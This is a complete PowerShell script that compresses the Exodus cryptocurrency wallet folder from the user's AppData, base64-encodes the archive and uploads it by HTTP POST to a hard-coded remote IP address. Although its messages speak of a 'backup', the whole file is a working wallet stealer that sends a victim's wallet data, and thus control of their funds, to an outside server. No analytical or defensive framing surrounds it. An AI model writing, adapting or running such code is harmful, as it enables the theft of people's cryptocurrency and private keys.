# === CONFIGURATION ===
$remoteServer = "http://144.172.116.76:8000/upload"
$exodusPath   = "$env:APPDATA\Exodus"
$zipPath      = "$env:TEMP\exodus_wallet_backup.zip"

# === 1. Zip the Exodus wallet folder ===
if (Test-Path $exodusPath) {
    Write-Host "[*] Compressing Exodus wallet folder..."
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    Compress-Archive -Path $exodusPath -DestinationPath $zipPath -Force
    Write-Host "[+] Exodus wallet zipped at $zipPath"
} else {
    Write-Host "[-] No Exodus wallet found on this machine."
    exit
}

# === 2. Convert ZIP to Base64 ===
Write-Host "[*] Encoding ZIP to Base64..."
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zipPath))
Write-Host "[+] Base64 encoding complete. Size: $($base64.Length) characters."

# === 3. Send Base64 as HTTP POST ===
Write-Host "[*] Sending Base64 to $remoteServer ..."
try {
    $response = Invoke-RestMethod -Uri $remoteServer -Method POST -Body @{ "data" = $base64 }
    Write-Host "[+] Upload complete! Server response:"
    Write-Host $response
} catch {
    Write-Host "[-] Upload failed: $($_.Exception.Message)"
}
